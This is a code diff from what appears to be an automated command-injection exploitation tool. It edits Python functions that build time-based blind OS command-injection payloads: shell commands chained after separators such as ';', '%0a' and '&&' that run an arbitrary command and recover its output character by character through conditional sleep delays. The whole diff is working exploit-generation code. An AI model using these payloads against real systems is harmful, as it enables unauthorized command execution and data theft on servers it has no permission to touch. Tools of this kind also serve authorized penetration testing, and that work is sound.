@@ -48,10 +48,11 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
       payload = (separator +
                  "str=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
-                 "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "if [ " + str(output_length) + " -ne $str1 ]" + separator +
-                 "then sleep 0" + separator +
-                 "else sleep " + str(timesec) + separator +
+                 "str1=${#str}" + separator +
+                 # "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "if [ " + str(output_length) + " -eq $str1 ]" + separator +
+                 # "then sleep 0" + separator +
+                 "then sleep " + str(timesec) + separator +
                  "fi"
                  )
 
@@ -63,7 +64,8 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "sleep 0 " + separator +
                  "str=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
-                 "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "str1=${#str}" + separator +
+                 # "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
                  "[ " + str(output_length) + " -eq $str1 ]" + separator +
                  "sleep " + str(timesec)
                  )
@@ -110,9 +112,9 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
       payload = (separator +
                  # Find the length of the output, using readline().
                  "str1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator +
-                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "else " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "if [ " + str(output_length) + " -eq ${str1} ]" + separator +
+                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "fi"
                  )
 
@@ -183,11 +185,11 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
     if separator == ";" or separator == "%0a":
       payload = (separator +
                  "str=" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + separator +
-                 #"str1=${%23str}" + separator +
-                 "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "if [ " + str(output_length) + " -ne $str1 ]" + separator +
-                 "then sleep 0" + separator +
-                 "else sleep " + str(timesec) + separator +
+                 # "str1=" + settings.CMD_SUB_PREFIX + "expr length \"$str\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "str1=${#str}" + separator +
+                 "if [ " + str(output_length) + " -eq $str1 ]" + separator +
+                 # "then sleep 0" + separator +
+                 "then sleep " + str(timesec) + separator +
                  "fi"
                 )
 
@@ -198,8 +200,8 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                  "sleep 0" + separator +
                  "str=" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd_exec + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + separator +
                  # Find the length of the output.
-                 "str1=" + settings.CMD_SUB_PREFIX + "expr length $str)" + separator +
-                 #"str1=${%23str}  " + separator +
+                 "str1=${#str}" + separator +
+                 # "str1=" + settings.CMD_SUB_PREFIX + "expr length $str)" + separator +
                  "[ " + str(output_length) + " -eq $str1 ]" + separator +
                  "sleep " + str(timesec)
                  )
@@ -246,10 +248,10 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
       payload = (separator +
                  # Find the length of the output, using readline().
                  "str1=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(len(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'))\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "if [ " + str(output_length) + " -ne ${str1} ]" + separator +
-                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "else " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "fi "
+                 "if [ " + str(output_length) + " -eq ${str1} ]" + separator +
+                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "fi"
                  )
 
     elif separator == _urllib.parse.quote("&&") :
@@ -321,10 +323,10 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 # Transform from Ascii to Decimal.
                 "str=" + settings.CMD_SUB_PREFIX + "printf '%d' \"'$char'\"" + settings.CMD_SUB_SUFFIX + separator +
                 # Perform the time-based comparisons
-                "if [ " + str(ascii_char) + " -ne $str ]" + separator +
-                "then sleep 0" + separator +
-                "else sleep " + str(timesec) + separator +
-                "fi "
+                "if [ " + str(ascii_char) + " -eq $str ]" + separator +
+                # "then sleep 0" + separator +
+                "then sleep " + str(timesec) + separator +
+                "fi"
                 )
 
     elif separator == _urllib.parse.quote("&&") :
@@ -386,9 +388,9 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
     if separator == ";" or separator == "%0a":
       payload = (separator +
                  "str=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(ord(\'" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + "))\'[" + str(num_of_chars-1) + ":" +str(num_of_chars)+ "]))\nexit(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
-                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "else " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "if [ " + str(ascii_char) + " -eq ${str} ]" + separator +
+                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "fi"
                  )
 
@@ -453,9 +455,9 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
     if separator == ";" or separator == "%0a":
       payload = (separator +
                  "str=\"" + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + "\"" + separator +
-                 "if [ " + str(ascii_char) + " -ne $str ]" + separator +
-                 "then sleep 0" + separator +
-                 "else sleep " + str(timesec) + separator +
+                 "if [ " + str(ascii_char) + " -eq $str ]" + separator +
+                 # "then sleep 0" + separator +
+                 "then sleep " + str(timesec) + separator +
                  "fi"
                  )
 
@@ -510,9 +512,9 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
     if separator == ";" or separator == "%0a":
       payload = (separator +
                  "str=" + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"print(" + settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + ")))\n\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "if [ " + str(ascii_char) + " -ne ${str} ]" + separator +
-                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
-                 "else " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "if [ " + str(ascii_char) + " -eq ${str} ]" + separator +
+                 # "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(0)\"" + settings.CMD_SUB_SUFFIX + separator +
+                 "then " + settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"import time\ntime.sleep(" + str(timesec) + settings.CMD_SUB_SUFFIX + "\"" + settings.CMD_SUB_SUFFIX + separator +
                  "fi"
                  )
 
